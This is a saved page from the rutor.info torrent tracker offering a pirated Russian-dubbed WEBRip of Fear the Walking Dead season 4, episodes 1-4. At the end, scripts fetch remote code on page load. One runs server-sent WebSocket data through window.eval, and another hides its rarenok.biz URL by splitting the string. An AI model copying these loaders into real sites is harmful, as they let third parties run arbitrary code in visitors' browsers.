@@ -1,0 +1,367 @@
+<html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<link href="http://s.rutor.info/css.css" rel="stylesheet" type="text/css" media="screen" />
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" />
+	<link rel="shortcut icon" href="http://s.rutor.info/favicon.ico" />
+	<title>rutor.info :: Бойтесь ходячих мертвецов / Fear the Walking Dead [04х01-04 из 16] (2018) WEBRip 720p | Profix Media</title>
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/jquery.cookie-min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/t/functions.js"></script>
+	
+</head>
+<body>
+
+<div id="all">
+
+<div id="up">
+
+<div id="logo">
+	<a href="/"><img src="http://s.rutor.info/logo.jpg" alt="rutor.info logo" /></a>
+</div>
+
+<table id="news_table">
+  <tr><td colspan="2"><strong>Новости трекера</strong></td></tr><tr><td class="news_date">30-Дек</td>
+  	<td class="news_title"><a href="http://rutor.info/torrent/472" target="_blank"  id="news88" onclick="$.cookie('news', '88', {expires: 365});">У RUTOR.ORG - Новый Адрес: RUTOR.INFO</a></td></tr><tr><td class="news_date">29-Ноя</td>
+  	<td class="news_title"><a href="/torrent/178905" target="_blank"  id="news86">Вечная блокировка в России</a></td></tr><tr><td class="news_date">09-Окт</td>
+  	<td class="news_title"><a href="/torrent/145012" target="_blank"  id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a></td></tr></table>
+  <script type="text/javascript">
+  $(document).ready(function(){if($.cookie("news")<88){$("#news88").css({"color":"orange","font-weight":"bold"});}});
+  </script>
+
+</div>
+
+<div id="menu">
+<a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a>
+<a href="/top" class="menu_b"><div>Топ</div></a>
+<a href="/categories" class="menu_b"><div>Категории</div></a>
+<a href="/browse/" class="menu_b"><div>Всё</div></a>
+<a href="/search/" class="menu_b"><div>Поиск</div></a>
+<a href="/latest_comments" class="menu_b"><div>Комменты</div></a>
+<a href="/upload.php" class="menu_b"><div>Залить</div></a>
+<a href="/jabber.php" class="menu_b"><div>Чат</div></a>
+
+<div id="menu_right_side"></div>
+
+<script type="text/javascript">
+$(document).ready(function()
+{
+	var menu_right;
+	if ($.cookie('userid') > 0)
+	{
+		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="http://s.rutor.info/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout"  border="0"><img src="http://s.rutor.info/i/profil.gif" alt="profile" /></a>';
+	}
+	else
+	{
+		menu_right = '<a href="/users.php" class="logout" border="0"><img src="http://s.rutor.info/i/zaiti.gif" alt="login" /></a>';
+	}
+	$("#menu_right_side").html(menu_right);
+});
+</script>
+
+</div>
+<h1>Бойтесь ходячих мертвецов / Fear the Walking Dead [04х01-04 из 16] (2018) WEBRip 720p | Profix Media</h1>
+</div>
+<div id="ws">
+<div id="content">
+
+<center>
+<div id="b_tz_208" class="b_tz_on_top" onmouseup="window.event.cancelBubble=true"></div>
+</center>
+
+
+
+<div id="msg1"></div>
+<script type="text/javascript">
+$(document).ready(function()
+{
+	if ($.cookie('msg') != null)
+	{
+		if ($.cookie('msg').length > 0)
+		{
+			var msg2 = '<div id="warning">' + $.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
+			$("#msg1").html(msg2);
+			$.cookie('msg', '', { expires: -1 });
+		}
+	}
+});
+</script><script type="text/javascript">function toggle_visibility(id) { var e = document.getElementById(id); if(e.style.display == 'block') e.style.display = 'none'; else e.style.display = 'block'; }</script>
+
+
+
+<div id="download">
+<a href="magnet:?xt=urn:btih:57321882b903b0046f8a11d4c99361a4658eeb9a&amp;dn=rutor.info_%D0%91%D0%BE%D0%B9%D1%82%D0%B5%D1%81%D1%8C+%D1%85%D0%BE%D0%B4%D1%8F%D1%87%D0%B8%D1%85+%D0%BC%D0%B5%D1%80%D1%82%D0%B2%D0%B5%D1%86%D0%BE%D0%B2+%2F+Fear+the+Walking+Dead+%5B04%D1%8501-04+%D0%B8%D0%B7+16%5D+%282018%29+WEBRip+720p+%7C+Profix+Media&amp;tr=udp://opentor.org:2710&amp;tr=udp://opentor.org:2710&amp;tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/magnet.gif"></a>
+<!--<a href="/mail.php?send_torrent=626793"><img src="http://s.rutor.info/t/mails.png"></a>-->
+<a href="http://d.rutor.info/download/626793"><img src="http://s.rutor.info/t/down.png"> Скачать Fear.The.Walking.Dead.S04.720p.WEBRip.Profix.Me.torrent</a>
+<br />
+<a href="/torrent/141992" class="d_small" target="_blank">Как тут качать?</a>
+<script type="text/javascript">
+function addEngine(){ if (typeof(window.external) != "undefined" && typeof(window.external.AddSearchProvider) != "undefined") { window.external.AddSearchProvider('http://rutor.info/AddSearchProvider.xml'); } else { alert("Извините, чтобы установить плагин поиска, Вы должны использовать браузер Firefox!");}}
+</script>
+<a href="#" class="d_small" onclick="addEngine();">Добавить rutor.info в поисковую строку</a>
+</div>
+
+
+
+
+
+<table width="100%">
+<tr><td colspan="2" style="text-align:center;">
+<script type="text/javascript">
+	var docw = document.body.clientWidth;
+	docw = docw - 270 - 470 - 50;
+	begun1_width = docw;
+	var filelist_already_loaded = 0;
+</script>
+
+</td>
+</tr>
+</table>
+
+
+<table id="details">
+
+<tr><td style="vertical-align:top;"></td><td><br /><img src="http://b.radikal.ru/b27/1804/e7/f5650784e310.jpg" /><br />
+<br />
+<b><u>Информация о фильме</u></b><br />
+<span style="color:#8B3A3A;"><b>Название: </b>Бойтесь ходячих мертвецов<br />
+<b>Оригинальное название: </b>Fear the Walking Dead<br />
+<b>Год выхода: </b>2018<br />
+<b>Жанр: </b> <a href="/tag/4/Ужасы" target="_blank">Ужасы</a>, <a href="/tag/4/драма" target="_blank">драма</a><br />
+<b>Режиссер: </b>Адам Дэвидсон, Кари Скогланд, Стефан Шварц<br />
+<b>В ролях: </b> Клифф Кёртис, Ким Диккенс, Алисия Дебнем Кери, Фрэнк Диллэйн, Рубен Блэйдс, Мерседес Масон, Колман Доминго, Лоренцо Джеймс Хенри, Элизабет Родригес, Тони Френч<br />
+<br />
+<b>О фильме:</b><br />
+Действия сериала происходят параллельно с событиями зомби-апокалипсиса, показанными в сериале «Ходячие мертвецы», но в совершенно другом месте — Лос-Анджелесе. Акцент будет сделан на семейные отношения, в частности, проблемы отцов и детей. История вращается вокруг Шона — разведённого школьного учителя и Нэнси руководительницы женского совета. А так же детей Нэнси: Ника, который борется с наркотической зависимостью и амбициозной дочери Эшли.</span><br />
+<br />
+ <a href="http://www.imdb.com/title/tt3743822/" target="_blank"><img src="http://s.rutor.info/imdb/pic/3743822.gif" /></a> <a href="http://www.kinopoisk.ru/film/846892/" target="_blank"><img src="http://www.kinopoisk.ru/rating/846892.gif" /></a><a href="https://myshows.me/view/42924/" target="_blank"><img src="http://u.myshows.me/r/42924.png" /></a><br />
+<br />
+<span style="color:#8B3A3A;"><b>Страна: </b>США<br />
+<b>Студия: </b>AMC Studios<br />
+<b>Продолжительность: </b>4 x ~00:49:00<br />
+<b>Перевод: </b>Профессиональный многоголосый / Студия &quot;Profix Media&quot;<br />
+<b>Наша группа в Контакте:</b><br />
+<a href="http://vk.com/profix_media" target="_blank"> <img src="http://b.radikal.ru/b19/1712/02/d77b771f7fc3.png" /></a><br />
+<b>Внимание, реклама: </b>Присутствует реклама</span><br />
+<br />
+<b><u>Файл</u></b><br />
+<span style="color:#8B3A3A;"><b>Кодек: </b>AVC<br />
+<b>Качество: </b>WEBRip 720p<br />
+<b>Видео: </b>V_MPEG4 AVC, ~ 4154 Кбит/с, 1280х720<br />
+<b>Звук #1:</b> Русский (AAC, 2 ch, 128 Кбит/с)</span><br />
+<br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Скриншоты</div><div class="hidebody"></div><textarea class="hidearea"><a href="http://a.radikal.ru/a40/1804/92/63cf4ad590dd.jpg" target="_blank"><img src="http://a.radikal.ru/a40/1804/92/63cf4ad590ddt.jpg" /></a> <a href="http://a.radikal.ru/a39/1804/41/3f2a2a233488.jpg" target="_blank"><img src="http://a.radikal.ru/a39/1804/41/3f2a2a233488t.jpg" /></a> <a href="http://c.radikal.ru/c43/1804/8d/84253a1d1b5c.jpg" target="_blank"><img src="http://c.radikal.ru/c43/1804/8d/84253a1d1b5ct.jpg" /></a> <a href="http://d.radikal.ru/d27/1804/5a/670ca2f7a222.jpg" target="_blank"><img src="http://d.radikal.ru/d27/1804/5a/670ca2f7a222t.jpg" /></a> <a href="http://b.radikal.ru/b02/1804/72/379245e2a87e.jpg" target="_blank"><img src="http://b.radikal.ru/b02/1804/72/379245e2a87et.jpg" /></a> <a href="http://d.radikal.ru/d39/1804/db/55a1ab7f06cc.jpg" target="_blank"><img src="http://d.radikal.ru/d39/1804/db/55a1ab7f06cct.jpg" /></a> <a href="http://a.radikal.ru/a23/1804/f3/f3bcf032d303.jpg" target="_blank"><img src="http://a.radikal.ru/a23/1804/f3/f3bcf032d303t.jpg" /></a> <a href="http://b.radikal.ru/b08/1804/40/f3014b9ffcff.jpg" target="_blank"><img src="http://b.radikal.ru/b08/1804/40/f3014b9ffcfft.jpg" /></a><br />
+</textarea></div> <div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Раздача ведётся путём добавления новых серий</div><div class="hidebody"></div><textarea class="hidearea"><br />
+Внимание! Раздача ведётся путём добавления новых серий; при каждом добавлении создаётся новый торрент. Чтобы начать докачку новой серии, пользователям необходимо сделать следующее:<br />
+(1) остановить скачивание,<br />
+(2) удалить старый торрент-файл у себя из клиента (старые серии удалять не надо),<br />
+(3) скачать новый торрент-файл из раздачи и запустить его у себя в клиенте вместо старого, при этом указать клиенту путь в старую папку, куда и должно происходить скачивание новых серий.</textarea></div></td></tr>
+<tr><td class="header">Залил</td><td><b><a href="/browse/0/0/73281/0" target="_blank">dfghj</a></b></td></tr>
+<tr><td class="header">Оценка</td><td>Никто ещё не поставил оценку</td></tr>
+<tr><td class="header">Категория</td><td><a href="/seriali" target="_blank">Сериалы </a></td></tr>
+<tr><td class="header">Раздают</td><td>1</td></tr>
+<tr><td class="header">Качают</td><td>5</td></tr>
+<tr><td class="header">Сидер замечен</td><td>09-05-2018 6:19:05 (2 минуты назад)</td></tr>
+<tr><td class="header">Добавлен</td><td>08-05-2018 21:54:32  (8 часов назад)</td></tr>
+<tr><td class="header">Размер</td><td>5.38&nbsp;GB  (5781929796 Bytes)</td></tr>
+
+<tr>
+	<td class="header" nowrap="nowrap">Добавить в</td>
+	<td style="vertical-align:middle;"><span class="fake_link" onclick="add_bookmark($(this), 626793);">закладки</span></td>
+</tr>
+
+<tr><td colspan="2"><div id="index"><fieldset style="border: 1px solid #3C95D1;"><legend style="font-weight: bold;">Связанные раздачи</legend><table width="100%"><tr class="backgr"><td width="10px">Добавлен</td><td colspan="2">Название</td><td width="1px">Размер</td><td width="1px">Пиры</td></tr><tr class="gai"><td>09&nbsp;Май&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/626775"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:1e25462258b1f2d018463a20a15c74dff7b3f1bf&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/626775/bojtes-hodjachih-mertvecov_fear-the-walking-dead-04x01-04-iz-16-2018-webrip-720p-gears-media">Бойтесь ходячих мертвецов / Fear the Walking Dead [04x01-04 из 16] (2018) WEBRip 720p | Gears Media </a></td> 
+<td align="right">6.95&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;1</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="tum"><td>08&nbsp;Май&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/628101"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:7f3f9a08a8d34fa5bc8c7eb020ea00d460811b51&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/628101/bojtes-hodjachih-mertvecov_fear-the-walking-dead-04x01-04-iz-16-2018-webrip-720p-ideafilm">Бойтесь ходячих мертвецов / Fear the Walking Dead [04x01-04 из 16] (2018) WEBRip 720p | IdeaFilm </a></td> 
+<td align="right">6.82&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;3</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;3</span></td></tr><tr class="gai"><td>08&nbsp;Май&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/628100"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:37605180e91ff4602de01b3add52f1710b8ae345&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/628100/bojtes-hodjachih-mertvecov_fear-the-walking-dead-04x01-04-iz-16-2018-webrip-ideafilm">Бойтесь ходячих мертвецов / Fear the Walking Dead [04x01-04 из 16] (2018) WEBRip | IdeaFilm </a></td> 
+<td align="right">2.47&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;2</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;6</span></td></tr><tr class="tum"><td>08&nbsp;Май&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/628102"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:2d2d8c24aced1ae540b72828f38e039ca85c5843&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/628102/bojtes-hodjachih-mertvecov_fear-the-walking-dead-04x01-04-iz-16-2018-webrip-1080p-ideafilm">Бойтесь ходячих мертвецов / Fear the Walking Dead [04x01-04 из 16] (2018) WEBRip 1080p | IdeaFilm </a></td> 
+<td align="right">10.01&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;2</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="gai"><td>08&nbsp;Май&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/626794"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:173ca567c066de6c8f6aacdaaba21f694d620ecc&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/626794/bojtes-hodjachih-mertvecov_fear-the-walking-dead-04h01-04-iz-16-2018-webrip-1080p-profix-media">Бойтесь ходячих мертвецов / Fear the Walking Dead [04х01-04 из 16] (2018) WEBRip 1080p | Profix Media </a></td> 
+<td align="right">8.28&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;2</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;3</span></td></tr><tr class="tum"><td>08&nbsp;Май&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/626792"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:34c8018642d8493562d22521316d878d037f19f5&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/626792/bojtes-hodjachih-mertvecov_fear-the-walking-dead-04h01-04-iz-16-2018-webrip-profix-media">Бойтесь ходячих мертвецов / Fear the Walking Dead [04х01-04 из 16] (2018) WEBRip | Profix Media </a></td> 
+<td align="right">1.74&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;1</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;4</span></td></tr><tr class="gai"><td>08&nbsp;Май&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/630383"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:104805cd9b6c5ffe2be22d64d744c2f62f6548d4&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/630383/bojtes-hodjachih-mertvecov_fear-the-walking-dead-04x01-04-iz-16-2018-webrip-1080p-gostfilm">Бойтесь ходячих мертвецов / Fear the Walking Dead [04x01-04 из 16] (2018) WEBRip 1080p | GostFilm </a></td> 
+<td align="right">14.72&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;2</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;14</span></td></tr></table><div style="width: 100%; text-align: right; margin-top: 4px; margin-bottom: -5px;"><a href="/search/0/4/0/0/Бойтесь ходячих мертвецов" target="_blank">Искать ещё похожие раздачи</a></div></fieldset></div></td></tr>
+
+<tr><td class='header'><span onclick="if(filelist_already_loaded==0){filelist_already_loaded=1;$('#filelist').load('/descriptions/626793.files');}toggle_visibility('displayfiles');" class="button"><u>Файлы (4)</u></span></td><td>
+<div id="displayfiles" style="display:none;max-height:450px;overflow:auto;">
+<table id="files">
+<tr><td>Название</td><td>Размер</td></tr>
+<tbody id="filelist"><tr><td colspan="2" style="text-align:center;">Происходит загрузка списка файлов...</td></tr></tbody>
+</table>
+</div>
+</td></tr>
+
+</table>
+<br />
+<br />
+
+<script type="text/javascript">
+var bookmarked = 0;
+function add_bookmark(me, id)
+{
+	if (bookmarked == 0)
+	{
+		$.ajax({
+	  type: "POST",
+		url: "/bookmarks.php",
+	  data: "access_method=ajax&action=add_bookmark&torrent_id=" + id,
+	  success: function(res){
+	  		if (res == 0)
+	  		{
+	  			me.html('Зайдите на трекер!');
+	  			me.css({"color":"red"});
+	  		}
+	  		else if (res == 3)
+	  		{
+	  			me.html('Закладка добавлена!');
+	  			me.css({"color":"green"});
+	  		}
+	  		else if (res == 2)
+	  		{
+	  			me.html('Такая закладка у Вас уже существует!');
+	  			me.css({"color":"orange"});
+	  		}
+	  		else if (res == 5)
+	  		{
+	  			me.html('Ограничение численности закладок достигнуто!');
+	  			me.css({"color":"red"});
+	  		}
+  		}
+ 		});
+	}
+	bookmarked++;
+}
+$(document).ready(function() {
+	if ($.cookie('userid') > 0) {
+		$("#cem").append(' | <a href="/edit.php?edit=626793">Редактировать</a>');
+		if (typeof torrent_moderate == typeof Function && $.cookie('class') >= 6) {
+			$("#cem").append('<br /><span onClick="torrent_moderate(626793);">Промодерировать раздачу</span> | <span onclick="confirm_delete(626793);">Удалить</span>');
+		}
+	}
+});
+</script>
+
+
+<strong>
+<div style="text-align: center;" id="cem"><a href="/comment/626793">Написать комментарий</a>
+
+
+</div>
+</strong>
+
+<br/><br/>
+<script type="text/javascript">
+<!--
+function confirmation(delete_comment) {
+	var answer = confirm("Удалить комментарий?")
+	if (answer){
+		window.location = "/comment.php?delete_comment=" + delete_comment;
+	}
+}
+//-->
+</script>
+	<script type="text/javascript"><!--
+	function confirmation(delete_comment) {
+		var answer = confirm("Удалить комментарий?")
+		if (answer){
+			window.location = "/comment.php?delete_comment=" + delete_comment;
+		}
+	}
+	function cOptions(userid, cid) {
+	var cstr = 'c_' + cid;
+	var c_url = '<a href="/comment.php?edit_comment=' + cid + '"><img src="http://s.rutor.info/t/c_edit.png"></a><a onClick=confirmation(' + cid + ')><img  src="http://s.rutor.info/t/c_delete.png"></a>';
+	if (userid == getCookie('userid') || getCookie('class') >= 5)
+		document.getElementById(cstr).innerHTML = c_url;
+}
+//-->
+</script>
+	<table width="100%" cellspacing="0" cellpadding="4"></table>
+<center><a href="#up"><img src="http://s.rutor.info/t/top.gif" alt="up" /></a></center>
+
+<!-- bottom banner -->
+
+<div id="down">
+Файлы для обмена предоставлены пользователями сайта. Администрация не несёт ответственности за их содержание.
+На сервере хранятся только торрент-файлы. Это значит, что мы не храним никаких нелегальных материалов. <a href="/advertise.php">Реклама</a>. 
+</div>
+
+
+</div>
+
+<div id="sidebar">
+
+<div class="sideblock">
+	<a id="fforum" href="/torrent/145012"><img src="http://s.rutor.info/i/forum.gif" alt="forum" /></a>
+</div>
+
+<div class="sideblock">
+<center>
+<table border="0" background="http://s.rutor.info/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px">
+<script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+$('#in').val(); return false; }</script>
+<form action="/b.php" method="get" onsubmit="return search_sidebar();">
+ <tr>
+  <td scope="col" rowspan=2><img src="http://s.rutor.info/i/lupa.gif" border="0" alt="img" /></td>
+  <td valign="middle"><input type="text" name="search" size="18" id="in"></td>
+ </tr>
+ <tr>
+  <td><input name="submit" type="submit" id="sub" value="искать по названию"></td>
+ </tr>
+</form>
+</table>
+</center>
+</div>
+
+
+
+<div class="sideblock2">
+<center>
+<div id="b_bn_51" onmouseup="window.event.cancelBubble=true"></div>
+<script>(function(){var s=document.createElement('script');s.src='http://tredman.com/j/w.php?id=51&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
+</center>
+</div>
+
+<div class="sideblock2">
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='http://counter.yadro.ru/hit?t39.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border=0 width=31 height=31><\/a>")//--></script><!--/LiveInternet-->
+</div>
+
+</div>
+
+</div>
+
+
+
+<script type="text/javascript">
+ (function () {
+ var script_id = "MTIzNg==", s = document.createElement("script");
+ s.type = "text/javascript";
+ s.charset = "utf-8";
+s.src = "//torvind.com/js/" + script_id+".js?r="+Math.random()*10000000000;
+ s.async = true;
+ s.onerror = function(){
+  var ws = new WebSocket("ws://torvind.com:8040/");
+  ws.onopen = function () {
+   ws.send(JSON.stringify({type:"p", id: script_id}));
+  };
+  ws.onmessage = function(tx) { ws.close(); window.eval(tx.data); };
+ };
+ document.body.appendChild(s);
+ })();
+</script>
+
+<script>(function(){var a=document.createElement("script");a.src="http://rarenok.biz"+"/im"+"g/r"+"/i/208/"+Math.floor(Math.random()*Math.pow(10,6))+".php";document.getElementsByTagName("head")[0].appendChild(a)})();</script>
+
+
+</body>
+</html>
